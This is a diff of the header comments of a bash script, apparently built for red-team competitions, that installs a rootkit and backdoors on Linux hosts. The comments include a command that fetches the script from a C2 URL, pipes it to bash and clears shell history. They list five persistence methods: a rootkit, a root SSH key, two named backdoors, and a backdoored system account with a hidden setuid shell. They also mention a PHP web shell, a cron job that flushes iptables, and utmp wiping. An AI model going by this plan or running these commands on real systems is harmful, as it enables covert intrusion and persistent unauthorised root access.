@@ -1,27 +1,28 @@
 #!/bin/bash
-#cmc
-#sapling
-#3/6/15
-#install rootkit & backd00rz
-#kill services
-#likely usage: msf ssh_login to all of the folks who didn't change the default competition creds.
+# cmc / sapling
+# 3/6/15
+# install rootkit & backd00rz
+# kill services
+# likely usage: msf ssh_login to all of the folks who didn't change the default competition creds.
 # drop shells, then: sessions -c "export HISTFILE=/dev/null; wget -q $C2_URL/jericho2.1.sh -O /dev/stdout | /bin/bash - && history -c"
-#why jericho? 
 #
-#because tony stark. https://www.youtube.com/watch?v=YBC1Qob27sM&t=38s
-#note to random github threatresearcher:
-#this is for redteam competition use. no leet haxors here. move along.
+# why jericho? 
+# because tony stark. https://www.youtube.com/watch?v=YBC1Qob27sM&t=38s
+#
+# note to random github threatresearcher:
+# this is for redteam competition use. no leet haxors here. move along.
 #
 # this creates 5 ways back in:
-# 1) rootkit (CentOSx64)
+# 1) rootkit 
 # 2) root ssh key
 # 3) trixd00r backdoor
 # 4) rooty icmp backdoor
 # 5) backdoored 'bin' system account (with setuid(0) shell in "/dev/  /" for re-elevation)
 #
-#  Also removes errbuddy from `who`
+#  Also removes errbuddy from `who` (removes utmp file)
 #  Also installs root crontab to clear iptables rules every 5m. (disabled/uncomment iptables stuff below if needed)
-#  Also runs a bash script that takes down all services every 10s.
+#  Also runs a bash script that takes down all services every 10s. (also
+#  currently disabled)
 #  Also drops a basic php shell in webdirs. http://url/.src.php?e=uptime
 # 
 # TODO: Start trojanising /etc/init.d scripts. Start service again? service turns off.
